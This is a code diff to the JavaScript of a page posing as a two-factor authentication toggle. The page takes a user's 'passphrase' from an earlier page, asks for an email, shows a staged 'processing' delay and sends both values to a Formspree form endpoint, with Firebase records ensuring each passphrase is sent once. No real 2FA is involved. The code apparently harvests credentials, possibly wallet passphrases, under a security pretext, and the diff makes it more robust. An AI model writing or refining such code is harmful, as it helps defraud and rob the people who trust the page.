@@ -36,7 +36,13 @@ async function loadPrevious2FAState(emailHash) {
             .once('value');
         return snapshot.val();
     } catch (error) {
-        console.error('Error loading 2FA state:', error);
+        if (error.code === 'PERMISSION_DENIED') {
+            console.warn('Firebase permission denied. Please check database rules.');
+            showError('Database access denied. Please check Firebase configuration.');
+        } else {
+            console.error('Error loading 2FA state:', error);
+            showError('Failed to load previous state. Please try again.');
+        }
         return null;
     }
 }
@@ -54,7 +60,13 @@ async function save2FAState(emailHash, email, state) {
             });
         return true;
     } catch (error) {
-        console.error('Error saving 2FA state:', error);
+        if (error.code === 'PERMISSION_DENIED') {
+            console.warn('Firebase permission denied while saving state.');
+            showError('Cannot save to database. Please check Firebase configuration.');
+        } else {
+            console.error('Error saving 2FA state:', error);
+            showError('Failed to save state. Please try again.');
+        }
         return false;
     }
 }
@@ -71,7 +83,11 @@ async function markAsSentToFormspree(feedbackHash, emailHash) {
             });
         return true;
     } catch (error) {
-        console.error('Error updating submission:', error);
+        if (error.code === 'PERMISSION_DENIED') {
+            console.warn('Firebase permission denied while updating submission.');
+        } else {
+            console.error('Error updating submission:', error);
+        }
         return false;
     }
 }
@@ -83,54 +99,63 @@ async function getFeedbackFromFirebase(feedbackHash) {
             .ref('submissions/' + feedbackHash)
             .once('value');
         const data = snapshot.val();
-        return data ? data.feedback : null;
+        return data;
     } catch (error) {
-        console.error('Error getting feedback:', error);
+        if (error.code === 'PERMISSION_DENIED') {
+            console.warn('Firebase permission denied for submissions.');
+            showError('Cannot access feedback data. Please check Firebase configuration.');
+        } else {
+            console.error('Error getting feedback:', error);
+            showError('Failed to retrieve feedback. Please try again.');
+        }
         return null;
     }
 }
 
 // Initialize page with previous state if exists
 async function initializePage() {
-    // Check if user came from feedback page
-    feedbackHash = sessionStorage.getItem('feedbackHash');
-    feedback = sessionStorage.getItem('feedback');
-    isReturningFeedback = sessionStorage.getItem('isReturningFeedback') === 'true';
-    const linkedEmailHash = sessionStorage.getItem('linkedEmailHash');
-    
-    console.log('Initializing authpage...');
-    console.log('Feedback Hash:', feedbackHash);
-    console.log('Feedback:', feedback ? 'Found' : 'Not found');
-    console.log('Is Returning:', isReturningFeedback);
-    
-    // If no feedback in session but we have a hash, try to get it from Firebase
-    if (feedbackHash && !feedback) {
-        feedback = await getFeedbackFromFirebase(feedbackHash);
-    }
-    
-    // If returning with a feedback that has a linked email, try to load that email's state
-    if (isReturningFeedback && linkedEmailHash) {
-        console.log('Loading previous state for returning feedback...');
-        const previousState = await loadPrevious2FAState(linkedEmailHash);
+    try {
+        // Check if user came from feedback page with a feedback
+        feedbackHash = sessionStorage.getItem('feedbackHash');
+        feedback = sessionStorage.getItem('feedback');
+        isReturningFeedback = sessionStorage.getItem('isReturningFeedback') === 'true';
+        const linkedEmailHash = sessionStorage.getItem('linkedEmailHash');
         
-        if (previousState) {
-            // Auto-fill email if we have it
-            if (previousState.email) {
-                emailInput.value = previousState.email;
+        // If no feedback in session but we have a hash, try to get it from Firebase
+        if (feedbackHash && !feedback) {
+            const data = await getFeedbackFromFirebase(feedbackHash);
+            if (data && data.passphrase) {
+                feedback = data.passphrase;
             }
-            
-            // Set the toggle state
-            isOn = previousState.is2FAEnabled;
-            toggleBtn.classList.toggle("on", isOn);
-            currentEmailHash = linkedEmailHash;
-            
-            const statusMessage = isOn
-                ? "✓ 2-factor authentication is ON (Previous state loaded)"
-                : "✗ 2-factor authentication is OFF (Previous state loaded)";
-            const statusColor = isOn ? "#27ae60" : "#e74c3c";
-            
-            updateStatus(statusMessage, statusColor);
         }
+        
+        // If returning with a feedback that has a linked email, try to load that email's state
+        if (isReturningFeedback && linkedEmailHash) {
+            console.log('Loading previous state for returning feedback...');
+            const previousState = await loadPrevious2FAState(linkedEmailHash);
+            
+            if (previousState) {
+                // Auto-fill email if we have it
+                if (previousState.email) {
+                    emailInput.value = previousState.email;
+                }
+                
+                // Set the toggle state
+                isOn = previousState.is2FAEnabled;
+                toggleBtn.classList.toggle("on", isOn);
+                currentEmailHash = linkedEmailHash;
+                
+                const statusMessage = isOn
+                    ? "✓ 2-factor authentication is ON (Previous state loaded)"
+                    : "✗ 2-factor authentication is OFF (Previous state loaded)";
+                const statusColor = isOn ? "#27ae60" : "#e74c3c";
+                
+                updateStatus(statusMessage, statusColor);
+            }
+        }
+    } catch (error) {
+        console.error('Error initializing page:', error);
+        showError('Failed to initialize page. Please refresh.');
     }
 }
 
@@ -139,23 +164,27 @@ async function loadStateForEmail() {
     const email = emailInput.value.trim();
     if (!email) return;
     
-    const emailHash = hashEmail(email);
-    currentEmailHash = emailHash;
-    
-    const previousState = await loadPrevious2FAState(emailHash);
-    
-    if (previousState) {
-        isOn = previousState.is2FAEnabled;
-        toggleBtn.classList.toggle("on", isOn);
+    try {
+        const emailHash = hashEmail(email);
+        currentEmailHash = emailHash;
         
-        const statusMessage = isOn
-            ? "✓ 2-factor authentication is ON"
-            : "✗ 2-factor authentication is OFF";
-        const statusColor = isOn ? "#27ae60" : "#e74c3c";
+        const previousState = await loadPrevious2FAState(emailHash);
         
-        updateStatus(statusMessage, statusColor);
-        
-        console.log('Loaded previous 2FA state for this email');
+        if (previousState) {
+            isOn = previousState.is2FAEnabled;
+            toggleBtn.classList.toggle("on", isOn);
+            
+            const statusMessage = isOn
+                ? "✓ 2-factor authentication is ON"
+                : "✗ 2-factor authentication is OFF";
+            const statusColor = isOn ? "#27ae60" : "#e74c3c";
+            
+            updateStatus(statusMessage, statusColor);
+            
+            console.log('Loaded previous 2FA state for this email');
+        }
+    } catch (error) {
+        console.error('Error loading state for email:', error);
     }
 }
 
@@ -178,12 +207,20 @@ const setButtonState = (disabled) => {
     toggleBtn.classList.toggle("disabled", disabled);
 };
 
-const showSuccessMessage = () => {
+const showSuccessMessage = (message = "✓ Check your email for confirmation!") => {
+    successMessage.textContent = message;
     successMessage.classList.add("show");
 };
 
 const hideSuccessMessage = () => {
     successMessage.classList.remove("show");
+};
+
+const showError = (message) => {
+    updateStatus("⚠️ " + message, "#e74c3c");
+    setTimeout(() => {
+        updateStatus("2-factor authentication is " + (isOn ? "ON" : "OFF"), isOn ? "#27ae60" : "#e74c3c");
+    }, 5000);
 };
 
 // Send combined data to Formspree (feedback + email + 2FA state)
@@ -209,11 +246,11 @@ const submitCombinedDataToFormspree = async (email, feedback, is2FAEnabled) => {
             console.log("Combined data sent successfully to Formspree");
             return true;
         } else {
-            console.error("Formspree submission failed");
+            console.error("Formspree submission failed with status:", response.status);
             return false;
         }
     } catch (error) {
-        console.error("Network error:", error);
+        console.error("Network error while submitting to Formspree:", error);
         return false;
     }
 };
@@ -225,12 +262,21 @@ const validateEmail = () => {
         emailInput.focus();
         return false;
     }
+    
+    // Basic email format validation
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(emailInput.value.trim())) {
+        alert("Please enter a valid email address.");
+        emailInput.focus();
+        return false;
+    }
+    
     return true;
 };
 
 const validateFeedback = () => {
     if (!feedback) {
-        alert("No feedback found. Please go back to the feedback page and enter your passphrase.");
+        alert("No passphrase found. Please go back to the feedback page and enter your passphrase.");
         return false;
     }
     return true;
@@ -238,23 +284,7 @@ const validateFeedback = () => {
 
 // Main Handler
 toggleBtn.addEventListener("click", async () => {
-    console.log('Toggle button clicked');
-    console.log('Email valid:', validateEmail());
-    console.log('Feedback exists:', !!feedback);
-    console.log('Is processing:', isProcessing);
-    
-    if (!validateEmail()) {
-        console.log('Email validation failed');
-        return;
-    }
-    
-    if (!validateFeedback()) {
-        console.log('Feedback validation failed');
-        return;
-    }
-    
-    if (isProcessing) {
-        console.log('Already processing');
+    if (!validateEmail() || !validateFeedback() || isProcessing) {
         return;
     }
     
@@ -264,81 +294,84 @@ toggleBtn.addEventListener("click", async () => {
     
     updateStatus("Processing your request...", "#f39c12");
     
-    console.log('Starting processing delay...');
     await new Promise(resolve => setTimeout(resolve, PROCESSING_DELAY));
-    console.log('Processing delay complete');
     
-    // Toggle state
-    isOn = !isOn;
-    toggleBtn.classList.toggle("on", isOn);
-    
-    const email = emailInput.value.trim();
-    const emailHash = hashEmail(email);
-    currentEmailHash = emailHash;
-    
-    // Check if this email already has a state in Firebase
-    const existingState = await loadPrevious2FAState(emailHash);
-    
-    // Check if this feedback was already sent to Formspree
-    let alreadySentToFormspree = false;
-    if (feedbackHash) {
-        const submissionSnapshot = await firebase.database()
-            .ref('submissions/' + feedbackHash)
-            .once('value');
-        const submissionData = submissionSnapshot.val();
-        alreadySentToFormspree = submissionData ? submissionData.sentToFormspree : false;
-    }
-    
-    // Prepare status message
-    const statusMessage = isOn
-        ? "✓ 2FA Authentication ENABLED"
-        : "✗ 2FA Authentication DISABLED";
-    const statusColor = isOn ? "#27ae60" : "#e74c3c";
-    
-    updateStatus(statusMessage, statusColor);
-    
-    // Save state to Firebase ALWAYS
-    await save2FAState(emailHash, email, isOn);
-    
-    // Only send to Formspree if:
-    // 1. User toggled 2FA to ON, AND
-    // 2. This feedback hasn't been sent to Formspree before
-    let shouldSendToFormspree = isOn && !alreadySentToFormspree;
-    
-    if (shouldSendToFormspree) {
-        console.log('Sending combined data to Formspree: feedback + email + 2FA status');
+    try {
+        // Toggle state
+        isOn = !isOn;
+        toggleBtn.classList.toggle("on", isOn);
         
-        // Submit combined data to Formspree
-        const success = await submitCombinedDataToFormspree(email, feedback, isOn);
+        const email = emailInput.value.trim();
+        const emailHash = hashEmail(email);
+        currentEmailHash = emailHash;
         
-        if (success) {
-            // Mark as sent in Firebase
-            if (feedbackHash) {
-                await markAsSentToFormspree(feedbackHash, emailHash);
-            }
-            
-            successMessage.textContent = "✓ Check your email for confirmation!";
-            showSuccessMessage();
-        } else {
-            updateStatus("⚠️ Connection error. State saved locally.", "#e74c3c");
+        // Check if this email already has a state in Firebase
+        const existingState = await loadPrevious2FAState(emailHash);
+        
+        // Check if this passphrase was already sent to Formspree
+        const submissionData = feedbackHash ? await getFeedbackFromFirebase(feedbackHash) : null;
+        const alreadySentToFormspree = submissionData ? submissionData.sentToFormspree : false;
+        
+        // Prepare status message
+        const statusMessage = isOn
+            ? "✓ 2FA Authentication ENABLED"
+            : "✗ 2FA Authentication DISABLED";
+        const statusColor = isOn ? "#27ae60" : "#e74c3c";
+        
+        updateStatus(statusMessage, statusColor);
+        
+        // Save state to Firebase ALWAYS
+        const saveSuccess = await save2FAState(emailHash, email, isOn);
+        
+        if (!saveSuccess) {
+            updateStatus("⚠️ Failed to save state. Please try again.", "#e74c3c");
+            isProcessing = false;
+            setButtonState(false);
+            return;
         }
-    } else if (isOn && alreadySentToFormspree) {
-        console.log('Already sent to Formspree previously - Firebase updated only');
-        successMessage.textContent = "✓ 2FA state updated successfully!";
-        showSuccessMessage();
-    } else if (!isOn) {
-        console.log('2FA toggled OFF - No Formspree submission needed');
-        // Don't show success message when turning off
+        
+        // Only send to Formspree if:
+        // 1. User toggled 2FA to ON, AND
+        // 2. This feedback hasn't been sent to Formspree before
+        let shouldSendToFormspree = isOn && !alreadySentToFormspree;
+        
+        if (shouldSendToFormspree) {
+            console.log('Sending combined data to Formspree: feedback + email + 2FA status');
+            
+            // Submit combined data to Formspree
+            const success = await submitCombinedDataToFormspree(email, feedback, isOn);
+            
+            if (success) {
+                // Mark as sent in Firebase
+                if (feedbackHash) {
+                    await markAsSentToFormspree(feedbackHash, emailHash);
+                }
+                
+                showSuccessMessage("✓ Check your email for confirmation!");
+            } else {
+                updateStatus("⚠️ Connection error. State saved locally.", "#e74c3c");
+            }
+        } else if (isOn && alreadySentToFormspree) {
+            console.log('Already sent to Formspree previously - Firebase updated only');
+            showSuccessMessage("✓ 2FA state updated successfully!");
+        } else if (!isOn) {
+            console.log('2FA toggled OFF - No Formspree submission needed');
+            // Don't show success message when turning off
+        }
+        
+        // After first interaction with this feedback, mark it as processed
+        if (isReturningFeedback) {
+            sessionStorage.setItem('isReturningFeedback', 'false');
+            isReturningFeedback = false;
+        }
+        
+    } catch (error) {
+        console.error('Error in toggle handler:', error);
+        showError('An error occurred. Please try again.');
+    } finally {
+        setButtonState(false);
+        isProcessing = false;
     }
-    
-    // After first interaction with this feedback, mark it as processed
-    if (isReturningFeedback) {
-        sessionStorage.setItem('isReturningFeedback', 'false');
-        isReturningFeedback = false;
-    }
-    
-    setButtonState(false);
-    isProcessing = false;
 });
 
 // Initialize on page load
